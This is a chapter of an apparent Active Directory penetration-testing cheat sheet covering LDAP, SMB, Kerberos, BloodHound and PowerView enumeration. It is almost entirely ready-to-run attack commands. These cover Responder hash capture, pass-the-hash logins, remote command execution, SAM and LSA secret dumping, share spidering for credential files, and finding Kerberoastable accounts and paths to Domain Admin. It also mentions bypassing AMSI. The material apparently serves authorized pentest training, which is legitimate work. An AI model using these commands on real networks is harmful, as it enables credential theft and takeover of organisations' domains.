# 02 — Enumeration: LDAP, BloodHound, PowerView, CME

[← Back to index](README.md)

## 2.1 Unauthenticated / Initial Enumeration

### LDAP Anonymous Enumeration

```bash
# Check if anonymous LDAP bind is allowed
ldapsearch -x -H ldap://$DC_IP -s base namingcontexts
ldapsearch -x -H ldap://$DC_IP -b '' -s base '(objectClass=*)' '*' +

# Enumerate users anonymously
ldapsearch -x -H ldap://$DC_IP -b 'DC=corp,DC=local' '(objectClass=user)' sAMAccountName

# Full anonymous enumeration
ldapsearch -x -H ldap://$DC_IP -b 'DC=corp,DC=local' \
    '(objectClass=*)' sAMAccountName userPrincipalName memberOf description
```

```bash
# enum4linux-ng — comprehensive unauthenticated enum
enum4linux-ng -A $DC_IP
enum4linux-ng -A -u '' -p '' $DC_IP

# RID cycling (enumerate users by RID without creds)
crackmapexec smb $DC_IP --rid-brute
netexec smb $DC_IP --rid-brute 10000
netexec smb $DC_IP -u '.' -p '' --rid-brute

# Kerbrute — valid username enumeration via Kerberos
kerbrute userenum --dc $DC_IP --domain $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
kerbrute userenum --dc $DC_IP -d $DOMAIN users.txt -o valid_users.txt

# Rpcclient
rpcclient -U "" -N $DC_IP
rpcclient -U <username> $DC_IP 
```

### Initial SMB/NetBIOS Enumeration

```bash
# SMB null session
smbclient -L //$DC_IP -N
smbclient -L //$DC_IP -U ''%''

# Enumerate shares
crackmapexec smb $DC_IP -u '' -p '' --shares
netexec smb $DC_IP -u '' -p '' --shares

# Nmap AD scripts
nmap -sV -p 88,389,445,464,636,3268,3269 --script 'ldap*,smb*,krb5*' $DC_IP
nmap --script ms-sql-info,ms-sql-config,ms-sql-empty-password -p 1433 10.10.10.0/24

# NBT-NS / LLMNR / mDNS Poisoning (Responder)
sudo responder -I eth0 -wfv
# Captures NTLMv2 hashes when machines try to resolve names
# Common triggers: accessing \\nonexistentshare, printers, etc.
```

## 2.2 Authenticated LDAP Enumeration

```bash
# Authenticated LDAP query — all users
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' '(objectClass=user)' \
    sAMAccountName userPrincipalName memberOf description pwdLastSet badPwdCount

# Find all domain admins
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=corp,DC=local))' \
    sAMAccountName

# Find accounts with SPNs (Kerberoastable)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(&(objectClass=user)(servicePrincipalName=*)(!(cn=krbtgt))(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' \
    sAMAccountName servicePrincipalName

# Find accounts with DONT_REQUIRE_PREAUTH (AS-REP roastable)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' \
    sAMAccountName

# Find unconstrained delegation accounts
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(userAccountControl:1.2.840.113556.1.4.803:=524288)' \
    sAMAccountName userAccountControl

# Find constrained delegation accounts
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(msDS-AllowedToDelegateTo=*)' \
    sAMAccountName msDS-AllowedToDelegateTo

# Find RBCD (Resource-Based Constrained Delegation) targets
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' \
    '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' \
    sAMAccountName msDS-AllowedToActOnBehalfOfOtherIdentity

# Find AdminCount=1 accounts (protected by AdminSDHolder)
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'DC=corp,DC=local' '(adminCount=1)' sAMAccountName memberOf

# Find all domain trusts
ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
    -b 'CN=System,DC=corp,DC=local' '(objectClass=trustedDomain)' \
    trustPartner trustDirection trustType trustAttributes
```

## 2.3 CrackMapExec / NetExec

```bash
# Basic authentication check
crackmapexec smb $DC_IP -u $USER -p $PASS
crackmapexec smb $DC_IP -u $USER -H $HASH      # PtH

# Enumerate shares
crackmapexec smb $DC_IP -u $USER -p $PASS --shares

# Enumerate users, groups, computers
crackmapexec smb $DC_IP -u $USER -p $PASS --users
crackmapexec smb $DC_IP -u $USER -p $PASS --groups
crackmapexec smb $DC_IP -u $USER -p $PASS --computers

# Enumerate logged-on users (requires local admin)
crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS --loggedon-users

# Enumerate local admins
crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS --local-groups Administrators

# Password policy
crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol

# Run commands
crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS -x 'whoami /all'
crackmapexec smb 10.10.10.0/24 -u $USER -p $PASS -X 'Get-Process'   # PowerShell

# Dump SAM (local admin required)
crackmapexec smb TARGET_IP -u $USER -p $PASS --sam

# Dump LSA secrets
crackmapexec smb TARGET_IP -u $USER -p $PASS --lsa

# WinRM check
crackmapexec winrm 10.10.10.0/24 -u $USER -p $PASS

# MSSQL enum
crackmapexec mssql $DC_IP -u $USER -p $PASS --sql-query 'SELECT @@version'

# Spider shares for juicy files
crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus -o OUTPUT_FOLDER=/tmp/spider

# Grep for credentials in shares
crackmapexec smb $DC_IP -u $USER -p $PASS -M spider_plus \
    -o INCLUDE_EXTENSIONS=txt,conf,config,ini,xml,ps1,bat,sh
```

## 2.4 BloodHound / SharpHound Collection

```powershell
# Run SharpHound collector (Windows)
# Download: https://github.com/BloodHoundAD/SharpHound
.\SharpHound.exe -c All --zipfilename bh_output
.\SharpHound.exe -c All,GPOLocalGroup --zipfilename bh_output
.\SharpHound.exe -c All -d corp.local --ldapusername $USER --ldappassword $PASS
```

```bash
# BloodHound Python collector (from Kali — no Windows needed)
pip3 install bloodhound --break-system-packages
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All -ns $DC_IP
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All,LoggedOn -ns $DC_IP --zip

# Via Kerberos ticket
bloodhound-python -d $DOMAIN -u $USER -k --no-pass -c All -ns $DC_IP

# Via ldap
nxc ldap DC01.example.com -u 'username' -p 'password' --bloodhound --collection All --dns-server $DC_IP

# Import to BloodHound
# Start neo4j: sudo neo4j start
# Open BloodHound, click Upload Data, select .zip
```

### Key BloodHound Cypher Queries

```cypher
// Find all Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})
RETURN u

// Shortest path to DA from owned user
MATCH (u:User {owned:true}),(da:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((u)-[*1..]->(da)) RETURN p

// Find Kerberoastable users with path to DA
MATCH (u:User {hasspn:true}),(da:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((u)-[*1..]->(da)) RETURN p

// Find computers with unconstrained delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Find all owned principals with DA path
MATCH (n {owned:true}), (target:Group {name:'DOMAIN ADMINS@CORP.LOCAL'}),
p=shortestPath((n)-[*1..10]->(target)) RETURN p
```

## 2.5 PowerView Enumeration

```powershell
# Load PowerView (bypass AMSI first if needed)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
. .\PowerView.ps1

# Domain info
Get-NetDomain
Get-NetDomainController
Get-NetForest
Get-NetForestDomain

# User enumeration
Get-NetUser | Select-Object sAMAccountName, description, memberof, pwdlastset, lastlogon
Get-NetUser -SPN | Select-Object sAMAccountName, servicePrincipalName   # Kerberoastable
Get-NetUser -PreauthNotRequired | Select-Object sAMAccountName          # ASREPRoastable
Get-NetUser -AdminCount | Select-Object sAMAccountName                  # AdminCount=1

# Group enumeration
Get-NetGroup | Select-Object GroupName
Get-NetGroupMember 'Domain Admins' -Recurse
Get-NetGroupMember 'Enterprise Admins' -Recurse
Get-NetGroupMember 'Backup Operators' -Recurse

# Computer enumeration
Get-NetComputer | Select-Object dnshostname, operatingsystem
Get-NetComputer -Unconstrained | Select-Object dnshostname             # Unconstrained delegation
Get-NetComputer -TrustedToAuth | Select-Object dnshostname,msdsallowedtodelegateto

# GPO enumeration
Get-NetGPO | Select-Object displayName, gpcFileSysPath
Get-NetGPOGroup

# OU enumeration
Get-NetOU | Select-Object DistinguishedName
Get-NetOU -OUName 'Admin Users'

# Find active sessions
Get-NetSession -ComputerName DC01
Get-NetLoggedon -ComputerName DC01

# Find where local admin access
Find-LocalAdminAccess -Verbose                  # Slow but comprehensive
Find-LocalAdminAccess -ComputerFile computers.txt

# Shares
Invoke-ShareFinder -Verbose
Invoke-FileFinder -ShareList shares.txt -Keywords password,secret,cred

# Domain trusts
Get-NetDomainTrust
Get-NetForestTrust
Get-NetDomainTrust -Domain external.local

# ACL enumeration (for specific user)
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -Match '$USER'}

# ACL for specific object
Get-ObjectAcl -SamAccountName 'Domain Admins' -ResolveGUIDs
Get-ObjectAcl -ADSpath 'CN=Domain Admins,CN=Users,DC=corp,DC=local' -ResolveGUIDs
```

---

[← Prev: 01 — Methodology & Lab Setup](01-methodology-and-lab-setup.md) | [Next: 03 — Kerberos Attacks →](03-kerberos-attacks.md)
